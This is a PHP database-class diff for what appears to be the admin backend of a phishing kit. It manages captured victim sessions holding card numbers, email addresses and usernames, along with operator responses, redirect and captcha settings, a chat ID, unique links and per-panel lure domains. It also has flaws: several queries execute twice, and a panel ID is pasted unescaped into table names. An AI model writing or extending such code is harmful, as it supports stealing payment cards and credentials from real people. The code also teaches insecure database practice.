@@ -325,7 +325,7 @@ class DB
 
     public static function getPanelList($conn, $user)
     {
-        $query = $conn->prepare("SELECT panels.panelId , nodes.nodeID, nodes.NodeName, expires FROM `panels` INNER JOIN `nodes` ON `panels`.`nodeID` = `nodes`.`nodeID` where userId=?");
+        $query = $conn->prepare("SELECT panels.panelId , nodes.nodeID, nodes.NodeName, expires, panelType FROM `panels` INNER JOIN `nodes` ON `panels`.`nodeID` = `nodes`.`nodeID` where userId=?");
         $query->bind_param('i', $user['userId']);
         $query->execute();
         $queryresult = $query->get_result();
@@ -339,7 +339,7 @@ class DB
     public static function getPanelsAddedTo($conn, $user)
     {
         $query = $conn->prepare(
-            "SELECT panels.panelId , nodes.nodeID, nodes.NodeName, expires, access FROM panel_access " .
+            "SELECT panels.panelId , nodes.nodeID, nodes.NodeName, expires, access, panelType FROM panel_access " .
                 "INNER JOIN panels ON panels.panelId = panel_access.panelId  " .
                 "INNER JOIN nodes ON nodes.nodeId = panels.nodeId " .
                 "where panel_access.userId=?"
@@ -406,7 +406,7 @@ class DB
 
     public static function getPanelSettings($conn, $panelId)
     {
-        $query = $conn->prepare("SELECT Mobile_Only, Redirect_All, Enable_Captcha, Enable_Turnstile, CFSiteSecret, CFSiteKey FROM panels where panelID=?");
+        $query = $conn->prepare("SELECT Mobile_Only, Redirect_All, Enable_Captcha, Enable_Turnstile, Enable_Panel_ChatId, ChatId, CFSiteSecret, CFSiteKey FROM panels where panelID=?");
         $query->bind_param('s', $panelId);
         $query->execute();
         $queryresult = $query->get_result();
@@ -488,28 +488,43 @@ class DB
     public static function getSessions($conn, $filter)
     {
         $time = time();
-        $query = "SELECT * FROM logs ";
-        $period = "7776000";
-        if ($filter == "recent") {
-            $period = "30";
+        $exceptiontime = "30"; // 30s 
+        $period =  "157680000"; //5y
+
+        if(!$filter){
+            $exceptiontime = "172800"; //2d
         }
 
-        if ($filter == "input") {
-            $period = "5400";
+        if ($filter == "recent"){
+            $period = "259200"; //3d
         }
 
-        $query = $query . "WHERE (Last_Online > ($time - $period)  OR Last_Online IS NULL) ";
+        if ($filter == "inputs"){
+            $period = "1209600"; //14d
+        }
+        
+        $query = "SELECT * FROM logs WHERE Last_Online > ($time - $exceptiontime) ";
+
+
         $hasinput = "cardnumber IS NOT NULL " .
             "OR email_address IS NOT NULL OR username IS NOT NULL";
+
+        $hasresponse = "EXISTS (
+                SELECT 1 FROM respons 
+                WHERE respons.SessionID = logs.SessionID 
+                AND respons.respons IS NOT NULL
+        )";
+
         if (!$filter) {
-            $query = $query . "AND (Last_Online > $time - 30 OR $hasinput)";
+            $query = $query . "OR (Last_Online > $time - $period AND ($hasinput OR $hasresponse))";
         }
         if ($filter == "inputs" || $filter == "recent") {
-            $query = $query . "AND ($hasinput)";
+            $query = $query . "OR (Last_Online > $time - $period AND ($hasinput OR $hasresponse))";
         }
         if ($filter == "bookmarked") {
             $query = $query . "AND bookmark = TRUE ";
         }
+
         $query = $query . " ORDER BY Last_Online DESC";
         $statement = $conn->prepare($query);
         $statement->execute();
@@ -556,6 +571,15 @@ class DB
             return $result;
         }
         return false;
+    }
+
+    public static function insertResponse($dbConn,$sessionID,$type,$value){
+        $sql = "INSERT INTO respons VALUES(?,?,?,?,DEFAULT)";
+        $query = $dbConn -> prepare($sql);
+        $id = substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil(5/strlen($x)) )),1,5);
+        $query->bind_param('ssss',$sessionID,$id,$value,$type);
+        $status = $query->execute();
+        return $status;
     }
 
     public static function getOptions($conn, $blueprintName)
@@ -1210,6 +1234,119 @@ class DB
                 "VALUES (?, ?)"
         );
         $query->bind_param("ss", $blueprint_name, $pagefile);
+        $status = $query->execute();
+        return $status;
+    }
+    
+    public static function getUniqueLinks($conn){
+        $query = $conn->prepare("SELECT * FROM `uniquelinks` ORDER BY lastUpdate DESC");
+        $query->execute();
+        $queryresult = $query->get_result();
+        if ($queryresult->num_rows > 0) {
+            $result = $queryresult->fetch_all(MYSQLI_ASSOC);
+            return $result;
+        }
+        return [];
+    }
+    
+    public static function insertUniqueLink($conn, $linkId, $data, $field){
+        $query = $conn->prepare(
+            "INSERT INTO uniquelinks (`linkId`, `data` , `field`) " .
+                "VALUES (?, ?, ?)"
+        );
+        $query->bind_param("sss", $linkId, $data, $field);
+        $status = $query->execute();
+        return $status;
+    }
+    
+    public static function updateUniqueLink($conn, $linkId, $data){
+        $query = $conn->prepare(
+            "UPDATE uniquelinks SET data = ? WHERE linkId = ?"
+        );
+        $query->bind_param("ss",$data, $linkId);
+        $status = $query->execute();
+        return $status;
+    }
+    
+    public static function deleteUniqueLink($conn, $linkId){
+        $query = $conn->prepare(
+            "DELETE FROM uniquelinks wHERE linkId = ?"
+        );
+        $query->bind_param("s",$linkId);
+        $status = $query->execute();
+        return $status;
+    }
+
+    public static function savePanelFMCreds($conn, $panelId,$token)
+    {
+        $query = $conn->prepare(
+            "UPDATE panels SET fm_token = ? WHERE panelId = ?"
+        );
+        $query->bind_param("ss",$token, $panelId);
+        $status = $query->execute();
+        return $status;
+    }
+
+    public static function getPanelData($conn,$panelId){
+        $query = $conn->prepare("SELECT * FROM `panel_data` WHERE panelId=?");
+        $query->bind_param("s",$panelId);
+        $query->execute();
+        $queryresult = $query->get_result();
+        if ($queryresult->num_rows > 0) {
+            $result = $queryresult->fetch_all(MYSQLI_ASSOC);
+            return $result;
+        }
+        return [];
+    }
+
+    public static function savePanelData($conn,$panelId,$datakey,$val){
+        $query = $conn->prepare("REPLACE INTO `panel_data` VALUES(NULL,?,?,?)");
+        $query->bind_param("sss",$panelId,$datakey,$val);
+        $query->execute();
+        $status = $query->execute();
+        return $status;
+    }
+
+    public static function removePanelData($conn,$panelId,$datakey){
+        $query = $conn->prepare("DELETE FROM `panel_data` WHERE panelId=? AND datakey=?");
+        $query->bind_param("ss",$panelId,$datakey);
+        $query->execute();
+        $status = $query->execute();
+        return $status;
+    }
+    
+    public static function getPanelDomains($conn,$panelId){
+        $query = $conn->prepare("SELECT * FROM `$panelId`.`domains`");
+        //$query->bind_param("s",$panelId);
+        $query->execute();
+        $queryresult = $query->get_result();
+        if ($queryresult->num_rows > 0) {
+            $result = $queryresult->fetch_all(MYSQLI_ASSOC);
+            return $result;
+        }
+        return [];
+    }
+    
+    public static function addPanelDomain($conn,$panelId,$domainUrl,$startpage){
+        $query = $conn->prepare("INSERT IGNORE INTO $panelId.`domains` (`domainUrl`,`startpage`) VALUES(?,?)");
+        $query->bind_param("ss",$domainUrl,$startpage);
+        $query->execute();
+        $status = $query->execute();
+        return $status;
+    }
+    
+    public static function savePanelDomain($conn,$panelId,$domainUrl,$newDomainUrl,$startpage){
+        $query = $conn->prepare("UPDATE $panelId.`domains` SET `domainUrl` = ? ,`startpage` = ?  WHERE `domainUrl` = ?");
+        $query->bind_param("sss",$newDomainUrl,$startpage,$domainUrl);
+        $query->execute();
+        $status = $query->execute();
+        return $status;
+    }
+    
+    public static function deletePanelDomain($conn,$panelId,$domainUrl){
+        $query = $conn->prepare("DELETE FROM $panelId.`domains` WHERE domainUrl=?");
+        $query->bind_param("s",$domainUrl);
+        $query->execute();
         $status = $query->execute();
         return $status;
     }
